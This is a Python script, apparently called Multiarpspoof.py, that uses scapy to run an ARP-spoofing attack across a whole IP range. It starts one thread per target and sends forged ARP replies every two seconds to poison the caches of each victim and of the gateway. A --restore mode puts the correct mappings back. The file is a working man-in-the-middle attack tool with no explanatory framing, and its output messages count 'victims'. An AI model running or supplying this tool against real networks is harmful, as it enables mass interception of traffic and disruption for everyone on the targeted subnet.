import scapy.all as scapy
import time
import sys
sys.dont_write_bytecode = True
import threading
import ipaddress

interval = 2
start_ip = ipaddress.IPv4Address(sys.argv[2])
end_ip = ipaddress.IPv4Address(sys.argv[3])
ip_gateway = sys.argv[4]
#py Multiarpspoof.py --spoof 123.123.123.0 123.123.123.255 123.123.1.1

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def arpSpoof(ip_target):
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
def arpRestore(ip_target):
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
    exit()

if sys.argv[1] == "--spoof":
    print(f"Spoofing {(int(end_ip) - int(start_ip)) + 1} victims!", flush=True)
    for ip_int in range(int(start_ip), int(end_ip) + 1):
        ip = str(ipaddress.IPv4Address(ip_int))
        try:
            threading.Thread(target=arpSpoof, args=(ip,)).start()
        except:
            print("Exception is thrown", flush=True)
            continue
    while True:
        print(f"Sending 2 packets to {(int(end_ip) - int(start_ip)) + 1} targets!", flush=True)
        time.sleep(interval)
elif sys.argv[1] == "--restore":
    print(f"Attacks ended, restoring {(int(end_ip) - int(start_ip)) + 1} ip arrangements!", flush=True)
    for ip_int in range(int(start_ip), int(end_ip) + 1):
        ip = str(ipaddress.IPv4Address(ip_int))
        try:
            threading.Thread(target=arpRestore, args=(ip,)).start()
        except:
            print("Exception is thrown", flush=True)
            continue